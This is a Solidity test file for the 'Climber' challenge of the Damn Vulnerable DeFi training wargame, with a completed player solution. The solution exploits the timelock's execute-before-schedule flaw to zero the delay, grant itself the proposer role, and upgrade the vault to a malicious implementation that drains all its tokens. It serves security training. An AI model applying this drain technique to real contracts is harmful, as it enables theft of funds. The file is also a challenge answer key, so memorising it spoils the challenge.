// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity =0.8.25;

import {Test, console} from "forge-std/Test.sol";
import {ClimberVault} from "../../src/climber/ClimberVault.sol";
import {ClimberTimelock, CallerNotTimelock, PROPOSER_ROLE, ADMIN_ROLE} from "../../src/climber/ClimberTimelock.sol";
import {ERC1967Proxy} from "@openzeppelin/contracts/proxy/ERC1967/ERC1967Proxy.sol";
import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
import {AccessControl} from "@openzeppelin/contracts/access/AccessControl.sol";
import {WITHDRAWAL_LIMIT, WAITING_PERIOD} from "../../src/climber/ClimberConstants.sol";
import {SafeTransferLib} from "solady/utils/SafeTransferLib.sol";
import {UUPSUpgradeable} from "@openzeppelin/contracts-upgradeable/proxy/utils/UUPSUpgradeable.sol";

contract ClimberChallenge is Test {
    address deployer = makeAddr("deployer");
    address player = makeAddr("player");
    address proposer = makeAddr("proposer");
    address sweeper = makeAddr("sweeper");
    address recovery = makeAddr("recovery");

    uint256 constant VAULT_TOKEN_BALANCE = 10_000_000e18;
    uint256 constant PLAYER_INITIAL_ETH_BALANCE = 0.1 ether;
    uint256 constant TIMELOCK_DELAY = 60 * 60;

    ClimberVault vault;
    ClimberTimelock timelock;
    DamnValuableToken token;

    modifier checkSolvedByPlayer() {
        vm.startPrank(player, player);
        _;
        vm.stopPrank();
        _isSolved();
    }

    /**
     * SETS UP CHALLENGE - DO NOT TOUCH
     */
    function setUp() public {
        startHoax(deployer);
        vm.deal(player, PLAYER_INITIAL_ETH_BALANCE);

        // Deploy the vault behind a proxy,
        // passing the necessary addresses for the `ClimberVault::initialize(address,address,address)` function
        vault = ClimberVault(
            address(
                new ERC1967Proxy(
                    address(new ClimberVault()), // implementation
                    abi.encodeCall(
                        ClimberVault.initialize,
                        (deployer, proposer, sweeper)
                    ) // initialization data
                )
            )
        );

        // Get a reference to the timelock deployed during creation of the vault
        timelock = ClimberTimelock(payable(vault.owner()));

        // Deploy token and transfer initial token balance to the vault
        token = new DamnValuableToken();
        token.transfer(address(vault), VAULT_TOKEN_BALANCE);

        vm.stopPrank();
    }

    /**
     * VALIDATES INITIAL CONDITIONS - DO NOT TOUCH
     */
    function test_assertInitialState() public {
        assertEq(player.balance, PLAYER_INITIAL_ETH_BALANCE);
        assertEq(vault.getSweeper(), sweeper);
        assertGt(vault.getLastWithdrawalTimestamp(), 0);
        assertNotEq(vault.owner(), address(0));
        assertNotEq(vault.owner(), deployer);

        // Ensure timelock delay is correct and cannot be changed
        assertEq(timelock.delay(), TIMELOCK_DELAY);
        vm.expectRevert(CallerNotTimelock.selector);
        timelock.updateDelay(uint64(TIMELOCK_DELAY + 1));

        // Ensure timelock roles are correctly initialized
        assertTrue(timelock.hasRole(PROPOSER_ROLE, proposer));
        assertTrue(timelock.hasRole(ADMIN_ROLE, deployer));
        assertTrue(timelock.hasRole(ADMIN_ROLE, address(timelock)));

        assertEq(token.balanceOf(address(vault)), VAULT_TOKEN_BALANCE);
    }

    /**
     * CODE YOUR SOLUTION HERE
     */
    function test_climber() public checkSolvedByPlayer {
        VaultSolverImplementation vaultSolverImpl = new VaultSolverImplementation();
        TimelockSolver solver = new TimelockSolver(
            timelock,
            vault,
            vaultSolverImpl,
            address(token),
            recovery
        );

        //data for execute()
        address[] memory targets = new address[](4);
        uint256[] memory values = new uint256[](4);
        bytes[] memory dataElements = new bytes[](4);
        bytes32 salt = 0;

        targets[0] = address(timelock);
        values[0] = 0;
        dataElements[0] = abi.encodeCall(
            ClimberTimelock.updateDelay,
            (uint64(0))
        );
        targets[1] = address(timelock);
        values[1] = 0;
        dataElements[1] = abi.encodeCall(
            AccessControl.grantRole,
            (PROPOSER_ROLE, address(solver))
        );
        targets[2] = address(vault);
        values[2] = 0;
        dataElements[2] = abi.encodeCall(
            UUPSUpgradeable.upgradeToAndCall,
            (
                address(vaultSolverImpl),
                abi.encodeCall(
                    VaultSolverImplementation.withdraw,
                    (address(token), recovery, VAULT_TOKEN_BALANCE)
                )
            )
        );
        targets[3] = address(solver);
        values[3] = 0;
        dataElements[3] = abi.encodeCall(TimelockSolver.init, ());

        //execute(updateDelay(0) -> grantRole(PROPOSER_ROLE, solver) -> upgradeToAndCall(vaultSolverImpl, withdraw()) -> solver.init())
        timelock.execute(targets, values, dataElements, salt);
    }

    /**
     * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
     */
    function _isSolved() private view {
        assertEq(token.balanceOf(address(vault)), 0, "Vault still has tokens");
        assertEq(
            token.balanceOf(recovery),
            VAULT_TOKEN_BALANCE,
            "Not enough tokens in recovery account"
        );
    }
}

contract TimelockSolver {
    ClimberTimelock immutable timelock;
    ClimberVault immutable vault;
    VaultSolverImplementation immutable vaultSolverImpl;
    address immutable token;
    address immutable recovery;
    uint256 constant VAULT_TOKEN_BALANCE = 10_000_000e18;

    constructor(
        ClimberTimelock timelock_,
        ClimberVault vault_,
        VaultSolverImplementation vaultSolverImpl_,
        address token_,
        address recovery_
    ) {
        timelock = timelock_;
        vault = vault_;
        vaultSolverImpl = vaultSolverImpl_;
        token = token_;
        recovery = recovery_;
    }

    function init() external {
        //data for schedule()
        address[] memory scheduleTargets = new address[](4);
        uint256[] memory scheduleValues = new uint256[](4);
        bytes[] memory scheduleDataElements = new bytes[](4);
        bytes32 salt = 0;

        scheduleTargets[0] = address(timelock);
        scheduleValues[0] = 0;
        scheduleDataElements[0] = abi.encodeCall(
            ClimberTimelock.updateDelay,
            (uint64(0))
        );
        scheduleTargets[1] = address(timelock);
        scheduleValues[1] = 0;
        scheduleDataElements[1] = abi.encodeCall(
            AccessControl.grantRole,
            (PROPOSER_ROLE, address(this))
        );
        scheduleTargets[2] = address(vault);
        scheduleValues[2] = 0;
        scheduleDataElements[2] = abi.encodeCall(
            UUPSUpgradeable.upgradeToAndCall,
            (
                address(vaultSolverImpl),
                abi.encodeCall(
                    VaultSolverImplementation.withdraw,
                    (address(token), recovery, VAULT_TOKEN_BALANCE)
                )
            )
        );
        scheduleTargets[3] = address(this);
        scheduleValues[3] = 0;
        scheduleDataElements[3] = abi.encodeCall(TimelockSolver.init, ());

        //schedule(updateDelay(0) -> grantRole(PROPOSER_ROLE, solver) -> solver.init())
        timelock.schedule(
            scheduleTargets,
            scheduleValues,
            scheduleDataElements,
            salt
        );
    }
}

contract VaultSolverImplementation {
    function proxiableUUID() external pure returns (bytes32) {
        return
            0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc;
    }

    function withdraw(
        address token,
        address recipient,
        uint256 amount
    ) external {
        SafeTransferLib.safeTransfer(token, recipient, amount);
    }
}
